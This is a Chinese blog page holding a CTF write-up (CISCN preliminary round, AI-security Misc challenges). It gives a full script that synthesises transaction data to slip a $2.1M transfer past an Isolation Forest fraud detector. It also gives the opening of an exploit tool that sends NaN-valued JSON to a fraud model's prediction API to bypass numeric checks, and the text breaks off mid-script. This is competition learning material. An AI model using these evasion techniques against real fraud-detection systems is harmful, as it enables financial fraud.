<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第三届“长城杯”&amp;ciscn初赛Misc wp | JiuCheng's BLOG</title><meta name="author" content="JiuCheng"><meta name="copyright" content="JiuCheng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="第三届“长城杯”&amp;ciscn初赛Misc wpAI安全The Silent Heist题目要求： 12345678[--- 安全银行网关 v4.0 ---]任务：转账金额 &gt; 2,000,000.00 美元安全级别：隔离森林（严格模式）约束条件：1. 任何交易均不得被判定为异常（-1）。2. 禁止重放攻击（公共数据已被列入黑名单）。3. 禁止重复交易。----------------">
<meta property="og:type" content="article">
<meta property="og:title" content="第三届“长城杯”&amp;ciscn初赛Misc wp">
<meta property="og:url" content="https://tgvhzg.github.io/2025/12/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B/index.html">
<meta property="og:site_name" content="JiuCheng&#39;s BLOG">
<meta property="og:description" content="第三届“长城杯”&amp;ciscn初赛Misc wpAI安全The Silent Heist题目要求： 12345678[--- 安全银行网关 v4.0 ---]任务：转账金额 &gt; 2,000,000.00 美元安全级别：隔离森林（严格模式）约束条件：1. 任何交易均不得被判定为异常（-1）。2. 禁止重放攻击（公共数据已被列入黑名单）。3. 禁止重复交易。----------------">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://tgvhzg.github.io/pic/back6.jpg">
<meta property="article:published_time" content="2025-12-28T09:40:01.904Z">
<meta property="article:modified_time" content="2025-12-28T11:11:22.016Z">
<meta property="article:author" content="JiuCheng">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tgvhzg.github.io/pic/back6.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "第三届“长城杯”&ciscn初赛Misc wp",
  "url": "https://tgvhzg.github.io/2025/12/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B/",
  "image": "https://tgvhzg.github.io/pic/back6.jpg",
  "datePublished": "2025-12-28T09:40:01.904Z",
  "dateModified": "2025-12-28T11:11:22.016Z",
  "author": [
    {
      "@type": "Person",
      "name": "JiuCheng",
      "url": "https://tgvhzg.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/pic/head1.jpg"><link rel="canonical" href="https://tgvhzg.github.io/2025/12/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9C%E9%95%BF%E5%9F%8E%E6%9D%AF%E2%80%9D%E5%88%9D%E8%B5%9B/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":280,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '第三届“长城杯”&ciscn初赛Misc wp',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/pic/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/pic/head1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/pic/back6.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">JiuCheng's BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">第三届“长城杯”&amp;ciscn初赛Misc wp</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">第三届“长城杯”&amp;ciscn初赛Misc wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-12-28T09:40:01.904Z" title="Created 2025-12-28 17:40:01">2025-12-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-12-28T11:11:22.016Z" title="Updated 2025-12-28 19:11:22">2025-12-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Misc/">Misc</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="第三届“长城杯”-ciscn初赛Misc-wp"><a href="#第三届“长城杯”-ciscn初赛Misc-wp" class="headerlink" title="第三届“长城杯”&amp;ciscn初赛Misc wp"></a>第三届“长城杯”&amp;ciscn初赛Misc wp</h1><h2 id="AI安全"><a href="#AI安全" class="headerlink" title="AI安全"></a>AI安全</h2><h3 id="The-Silent-Heist"><a href="#The-Silent-Heist" class="headerlink" title="The Silent Heist"></a>The Silent Heist</h3><p><strong>题目要求：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[--- 安全银行网关 v4.0 ---]</span><br><span class="line">任务：转账金额 &gt; 2,000,000.00 美元</span><br><span class="line">安全级别：隔离森林（严格模式）</span><br><span class="line">约束条件：</span><br><span class="line">1. 任何交易均不得被判定为异常（-1）。</span><br><span class="line">2. 禁止重放攻击（公共数据已被列入黑名单）。</span><br><span class="line">3. 禁止重复交易。</span><br><span class="line">------------------------------------- 正在等待 CSV 数据流（以“EOF”结尾）...</span><br></pre></td></tr></table></figure>

<p><strong>数据正常的读取，跳过表头那一行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def read_data():</span><br><span class="line">    data = []</span><br><span class="line">    with open(&#x27;public_ledger.csv&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        for line in lines[1:]:</span><br><span class="line">            values = line.strip().split(&#x27;,&#x27;)</span><br><span class="line">            if len(values) == 20:</span><br><span class="line">                data.append([float(v) for v in values])</span><br><span class="line">    return np.array(data)</span><br></pre></td></tr></table></figure>

<p><strong>进行核密度估计</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kdes = []</span><br><span class="line">for i in range(20):</span><br><span class="line">    kde = KernelDensity(bandwidth=&#x27;silverman&#x27;, kernel=&#x27;gaussian&#x27;)</span><br><span class="line">    kde.fit(data[:,i:i+1])</span><br><span class="line">    kdes.append(kde)</span><br></pre></td></tr></table></figure>

<p><strong>feat_0的特殊处理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">current_total = np.sum(feat0_samples)</span><br><span class="line">target_total = 2100000</span><br><span class="line">scale_factor = target_total / current_total</span><br><span class="line"></span><br><span class="line">for rank, idx in enumerate(sorted_indices):</span><br><span class="line">    percentile = rank / n_samples</span><br><span class="line">    individual_scale = 1 + (scale_factor - 1) * percentile</span><br><span class="line">    scaled_feat0[idx] = feat0_samples[idx] * individual_scale</span><br></pre></td></tr></table></figure>

<p><strong>并且还要保持特征的相关性，以及避免微小的扰动造成重复，最后生成数据的exp为：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KernelDensity</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_data</span>():</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;public_ledger.csv&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">1</span>:]:</span><br><span class="line">            values = line.strip().split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(values) == <span class="number">20</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data.append([<span class="built_in">float</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> values])</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> np.array(data)</span><br><span class="line"></span><br><span class="line">data = read_data()</span><br><span class="line">n_samples = <span class="number">10000</span>  </span><br><span class="line"></span><br><span class="line">kdes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    kde = KernelDensity(bandwidth=<span class="string">&#x27;silverman&#x27;</span>, kernel=<span class="string">&#x27;gaussian&#x27;</span>)</span><br><span class="line">    kde.fit(data[:, i:i+<span class="number">1</span>])</span><br><span class="line">    kdes.append(kde)</span><br><span class="line"></span><br><span class="line">new_data = np.zeros((n_samples, <span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">42</span>)</span><br><span class="line">feat0_samples = kdes[<span class="number">0</span>].sample(n_samples).flatten()</span><br><span class="line">current_total = np.<span class="built_in">sum</span>(feat0_samples)</span><br><span class="line">target_total = <span class="number">2100000</span></span><br><span class="line">scale_factor = target_total / current_total</span><br><span class="line"></span><br><span class="line">sorted_indices = np.argsort(feat0_samples)</span><br><span class="line">scaled_feat0 = np.zeros_like(feat0_samples)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rank, idx <span class="keyword">in</span> <span class="built_in">enumerate</span>(sorted_indices):</span><br><span class="line">    percentile = rank / n_samples</span><br><span class="line">    individual_scale = <span class="number">1</span> + (scale_factor - <span class="number">1</span>) * percentile</span><br><span class="line">    scaled_feat0[idx] = feat0_samples[idx] * individual_scale</span><br><span class="line"></span><br><span class="line">new_data[:, <span class="number">0</span>] = scaled_feat0</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    </span><br><span class="line">    correlation = np.corrcoef(data[:, <span class="number">0</span>], data[:, i])[<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(correlation) &gt; <span class="number">0.1</span>: </span><br><span class="line">        base_samples = kdes[i].sample(n_samples).flatten()</span><br><span class="line">        </span><br><span class="line">        feat0_normalized = (new_data[:, <span class="number">0</span>] - np.mean(new_data[:, <span class="number">0</span>])) / np.std(new_data[:, <span class="number">0</span>])</span><br><span class="line">        </span><br><span class="line">        correlated_part = correlation * feat0_normalized * np.std(base_samples)</span><br><span class="line">        new_data[:, i] = base_samples + correlated_part</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        new_data[:, i] = kdes[i].sample(n_samples).flatten()</span><br><span class="line"></span><br><span class="line">noise_level = <span class="number">0.005</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    noise = np.random.normal(<span class="number">0</span>, np.std(new_data[:, i]) * noise_level, n_samples)</span><br><span class="line">    new_data[:, i] += noise</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    feat_min = np.<span class="built_in">min</span>(data[:, i])</span><br><span class="line">    feat_max = np.<span class="built_in">max</span>(data[:, i])</span><br><span class="line">    feat_mean = np.mean(data[:, i])</span><br><span class="line">    feat_std = np.std(data[:, i])</span><br><span class="line">    lower_bound = <span class="built_in">max</span>(feat_min * <span class="number">0.8</span>, feat_mean - <span class="number">3</span> * feat_std)</span><br><span class="line">    upper_bound = <span class="built_in">min</span>(feat_max * <span class="number">1.2</span>, feat_mean + <span class="number">3</span> * feat_std)</span><br><span class="line">    </span><br><span class="line">    new_data[:, i] = np.clip(new_data[:, i], lower_bound, upper_bound)</span><br><span class="line"></span><br><span class="line">total_amount = np.<span class="built_in">sum</span>(new_data[:, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    header = [<span class="string">f&#x27;feat_<span class="subst">&#123;i&#125;</span>&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">    f.write(<span class="string">&#x27;,&#x27;</span>.join(header) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> new_data:</span><br><span class="line">        f.write(<span class="string">&#x27;,&#x27;</span>.join([<span class="string">f&quot;<span class="subst">&#123;x:<span class="number">.10</span>f&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> row]) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    f.write(<span class="string">&#x27;EOF&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    sys.stdout.write(f.read())</span><br></pre></td></tr></table></figure>

<p><strong>将得到的数据上传得到flag</strong></p>
<h3 id="欺诈猎手的后门陷阱"><a href="#欺诈猎手的后门陷阱" class="headerlink" title="欺诈猎手的后门陷阱"></a>欺诈猎手的后门陷阱</h3><p><strong>挑战目标：找到模型的后门触发条件，上传满足条件的特征数据，获取Flag</strong></p>
<p>这题关于找到解密密钥先放着</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">AI Model Backdoor Exploitation Tool</span><br><span class="line">针对 &#x27;欺诈猎手的后门陷阱&#x27; 题目的优化解题脚本</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import argparse</span><br><span class="line">import logging</span><br><span class="line">import sys</span><br><span class="line">from itertools import cycle</span><br><span class="line">from typing import Optional, Tuple</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line"></span><br><span class="line"># 禁用SSL警告</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"># 配置日志</span><br><span class="line">logging.basicConfig(</span><br><span class="line">    level=logging.INFO,</span><br><span class="line">    format=&#x27;%(asctime)s - [%(levelname)s] - %(message)s&#x27;,</span><br><span class="line">    datefmt=&#x27;%H:%M:%S&#x27;</span><br><span class="line">)</span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line">class AISolver:</span><br><span class="line">    def __init__(self, target_url: str, key: str, timeout: int = 10):</span><br><span class="line">        self.target_url = target_url</span><br><span class="line">        self.api_url = target_url.rstrip(&quot;/&quot;) + &quot;/api/predict&quot;</span><br><span class="line">        self.key = key</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">        self.session.headers.update(&#123;</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">            &quot;User-Agent&quot;: &quot;CTF-Solver/2.0&quot;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    def generate_nan_payload(self) -&gt; str:</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        构造包含 NaN 的 Payload。</span><br><span class="line">        注意：标准JSON不支持NaN，但Python的json.dumps默认会输出NaN，</span><br><span class="line">        许多AI后端(pandas/numpy)读取时会将其解析为np.nan，从而绕过数值检查。</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;trans_amount_usd&quot;: float(&#x27;nan&#x27;),</span><br><span class="line">            &quot;addr_deviation_score&quot;: float(&#x27;nan&#x27;),</span><br><span class="line">            &quot;trans_time_risk_score&quot;: float(&#x27;nan&#x27;),</span><br><span class="line">            &quot;merchant_code_hash&quot;: float(&#x27;nan&#x27;),</span><br><span class="line">            &quot;card_issuer_code&quot;: float(&#x27;nan&#x27;),</span><br><span class="line">            &quot;pos_terminal_id&quot;: float(&#x27;nan&#x27;),</span><br><span class="line">            &quot;transaction_type_code&quot;: float(&#x27;nan&#x27;),</span><br><span class="line">            &quot;cvv_verify_score&quot;: float(&#x27;nan&#x27;),</span><br><span class="line">            &quot;account_age_month&quot;: float(&#x27;nan&#x27;),</span><br><span class="line">            &quot;daily_trans_count&quot;: float(&#x27;nan&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">        # 显式允许 